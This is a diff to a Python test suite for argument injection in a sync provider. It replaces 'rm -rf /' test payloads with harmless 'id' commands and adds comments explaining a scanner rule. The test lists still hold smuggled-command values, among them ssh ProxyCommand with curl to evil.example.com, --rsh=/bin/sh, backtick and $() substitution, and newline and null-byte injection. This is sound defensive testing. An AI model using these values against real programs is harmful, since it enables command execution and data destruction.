@@ -90,7 +90,13 @@ class TestArgumentInjection:
             "-e/bin/sh",
             "--rsh=/bin/sh",
             "-oProxyCommand=curl evil.example.com",
-            "host; rm -rf /",
+            # `id`, and deliberately not a root delete: what this case asserts is that the
+            # `;` is refused, so the trailing command is interchangeable — as the two
+            # entries right below it already show. A literal recursive root `rm` in a file
+            # that also holds an execution sink is a non-overridable DANGEROUS finding for
+            # core's scanner (rule `destructive_root`) and would make this bundle
+            # UNINSTALLABLE. The scanner reads comments too, so don't spell it out here.
+            "host; id",
             "host`whoami`",
             "host$(id)",
             "host with space",
@@ -112,7 +118,10 @@ class TestArgumentInjection:
             "--delete",
             "/srv/sync:evil",
             "host:/srv/sync",
-            "/srv/sync\nrm -rf /",
+            # `id`, and deliberately not a root delete: this case asserts the embedded
+            # NEWLINE is refused as a control character, so the trailing command is
+            # interchangeable. Same scanner reason as the host list above.
+            "/srv/sync\nid",
             "/srv/\x00sync",
         ],
     )
@@ -147,8 +156,11 @@ class TestArgumentInjection:
         monkeypatch.setattr(
             provider_mod.subprocess, "run", lambda *a, **k: calls.append((a, k))
         )
+        # `id`, and deliberately not a root delete: the assertion is that a host containing
+        # `;` never reaches a subprocess, not what follows the `;`. Same scanner reason as
+        # the refusal lists above.
         p = create_provider(
-            {"host": "host; rm -rf /", "path": "/srv/sync", "staging_dir": str(tmp_path)}
+            {"host": "host; id", "path": "/srv/sync", "staging_dir": str(tmp_path)}
         )
         p.push([SyncObject(key="k", data=b"v")])
         p.list_remote()
